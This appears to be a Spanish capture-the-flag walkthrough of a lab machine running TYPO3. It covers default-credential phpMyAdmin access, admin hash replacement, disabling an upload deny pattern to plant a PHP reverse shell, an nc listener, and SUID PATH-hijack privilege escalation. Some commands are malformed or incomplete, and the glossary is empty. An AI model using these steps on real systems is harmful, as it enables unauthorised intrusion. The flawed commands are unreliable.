# Machine Typo

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -sV 192.168.0.16
``` 
2. El resultado es el siguiente:

```
22/tcp   open  ssh     OpenSSH 7.9p1 Debian
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
8000/tcp open  http    Apache httpd 2.4.38
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
8081/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

## Analisis de vulnerabilidades

- Voy a nessus a realizar un escaneo pero no hay nada util

- Luego ejecute dirb de esta manera
```
$ dirb http://192.168.0.16:80
```
- El resultado que me genero son varias URL y la mas importante es esta
```
http://192.168.0.16:80/typo3/
```
- Ya que me genero el login de el CMS Typo3
- Tambien realice esta busqueda
```
$ dirb http://192.168.0.16:8081
```
- El resultado fue la URL de **phpmyadmin**
```
http://192.168.0.16:8081/phpmyadmin/index.php
```

## Exploiting

- Probe **root** como usuario y contraseña en **phpmyadmin** y funciono
- Voy a la tabla de nombre **bd_user** y hay dos usuarios entonces
- Decido cambiar la contraseña ya que la que tiene es esta
```
$argon2id$v=19$m=65536,t=16,p=2$Q2E3NG1YeTE5NkkxSi5hMg$Hn5lqwQnbYjlnZMPahFHjEWhCDwOcbDKjg3RrTfrVuE
```
- Es una contraseña que no habia visto nunca, pero al cambiarla e ingresar al logind del CMS no funciono
- Decido buscar por internet que es eso de **argon2** y es un generador de HASH
- Entonces genero un HASH nuevo con la palabra **admin** y al colocar esa palabra en el login funciono
- Como el CMS esta hecho en php decido buscar alguna seccion que me permita subir archivos
- Esto con el fin de hacer un **shell reverse** en PHP
- Pero no me aceptaba archivos con extensiones **.php**
- Entonces busque en internete y el CMS puede bloquearlos de esta manera
```
[BE][fileDenyPattern] = \.(php[3-8]?|phpsh|phtml|pht|phar|shtml|
```
- lo que hice fue quitar ese bloqueo y puede subir el archivo PHP
- Luego use **Netcat** para de esta manera
```
$ nc -lvp 4545
```
- Use **Curl** paa conectarme al puerto de **Netcat**
```
$ sudo curl -v http://192.168.0.16/filename/user.php
```
- Y logre obtener un **shell** pero como usuario **www-data**
- Para levantar privilegios empece a buscar archivos **SUID**
```
$ find / -type -f -perm -u=s 2>/dev/null
```
**-type f** => tipo de salida es solo archivo
**-perm -u=s** => usuarios SUID Bits
**2>/dev/null** => redirige todos los errores nulos (error estándar)

- Hay varios archivos **SUID** pero todos me piden contraseña **root**
- Pero hay un archivo de nombre **/usr/local/bin/apache2-restart**
- Busque en internet y el apache se ejecuta como **root** en la variable **PATH**
- Ejecuto el **apache2-restart** pero no funciona
- Entonces con el comando **cat** veo el codigo y esta todo raro
- Decido entonces usar el comando **strings** para ver el codigo mas legible
```
$ strings apache2-restart
```
- EL codigo tiene una linea que sirve para inicar el **apache2**
- Esa linea se ejecuta como **root**, entonces lo que podemos es crear un archivo
Que tenga el **/bin/bash** con todos los permisos
```
$ echo "/bin/bash" > privilages
```
- luego vamos a modificar nuestra variable **PATH** colocando el archivo **privilages**
```
$ export PATH=/tmp/:$PATH
```
- Por ultimo ya podemos ejcutar otra el **apache2-restart** y ya somos **root**
- Para activar el **Prompt** colocamos esto:
```
# python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Glosario

- El **apache2-restart**:
- El **/usr/local/bin**:
- El **/usr/bin**:
- El **/usr/lib**:

## Investigación

Variable **PATH** = https://www.hostinger.co/tutoriales/variables-de-entorno-linux-como-leerlas-y-configurarlas-vps/

https://argon2.online/

## Explotación maquina dc-1

https://www.hacknos.com/typo-1-walkthrough-vulnhub/
